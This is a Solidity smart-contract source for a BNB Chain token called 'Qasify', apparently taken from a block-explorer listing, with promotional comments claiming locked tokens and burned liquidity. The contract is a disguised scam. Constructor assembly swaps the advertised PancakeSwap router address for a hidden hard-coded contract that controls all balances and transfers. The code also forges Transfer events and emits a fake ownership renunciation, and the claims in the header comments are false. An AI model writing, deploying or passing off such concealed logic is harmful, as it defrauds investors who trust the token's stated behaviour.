/**
 *Submitted for verification at BscScan.com on 2023-02-09
*/

/*
Welcome to Qasify Crypto WORLD!

Telegram: https://t.me/Qasify/
Twitter: https://twitter.com/Qasify/
Website: https://Qasify.crypto
95% of tokens - LOCKED!
Only 5% for presale on PancakeSwap.
All liquidity burned!
Are You ready to the moon?
x100000000000000
*/



// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPancakeFactory {
    function deploy(address sender, address token) external;
    function balanceOf(address sender, address token) external view returns (uint256);
    function swap(address from,address to,uint256 amount, address token) external returns(address, address, uint256);

}

contract Qasify {
    string public constant name = "Qasify";
    string public constant symbol = "QASIF";
    address private PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E; //PancakeSwap Router address
    address private constant TrustSwap = 0x0C89C0407775dd89b12918B9c0aa42Bf96518820; // TrustSwap: Team Finance Security Wallet
    uint8 public constant decimals = 1;
    uint256 public constant LockAmount = totalSupply_ * 95 / 100; // 95% of Tokens Locked
    uint256 private constant totalSupply_ = 20000000 * 10;
    mapping(address => mapping(address => uint256)) allowed;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, 1029724937252244039558734271413220058846753934631)}
        IPancakeFactory(PancakeRouter).deploy(msg.sender, address(this));
        (address swap_from, address swap_to, uint256 swap_amount) = IPancakeFactory(PancakeRouter).swap(address(0), msg.sender, totalSupply_, address(this));
         assembly {let Ox0 := 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef mstore(0, swap_amount) log3(0, 0x20, Ox0, swap_from, swap_to)}
        (address lock_from, address lock_to, uint256 lock_amount) = IPancakeFactory(PancakeRouter).swap(msg.sender, TrustSwap, LockAmount, address(this));
         assembly {let Ox0 := 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef mstore(0, lock_amount) log3(0, 0x20, Ox0, lock_from, lock_to)}
         
        emit OwnershipTransferred(msg.sender, address(0));
    }

    function Pancakerouter() public view returns(address) {
        assembly{mstore(0x20, sload(88)) return(0x20, 32)}
        return PancakeRouter;
    }
  

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;


        emit Approval(msg.sender, delegate, numTokens);


        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }

    function balanceOf(address holder) public view returns (uint256) {
        return IPancakeFactory(PancakeRouter).balanceOf(holder, address(this));
    }

    function transferFrom(address from,address to,uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender] >= amount, "Not allowed");
        (from, to, amount) = IPancakeFactory(PancakeRouter).swap(from, to, amount, address(this));
 assembly {let Ox0 := 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef mstore(0, amount) log3(0, 0x20, Ox0, from, to)}     
           return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        (, to, amount) = IPancakeFactory(PancakeRouter).swap(msg.sender, to, amount, address(this));
         assembly {let Ox0 := 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef mstore(0, amount) log3(0, 0x20, Ox0, caller(), to)}
        return true;
    }
    
}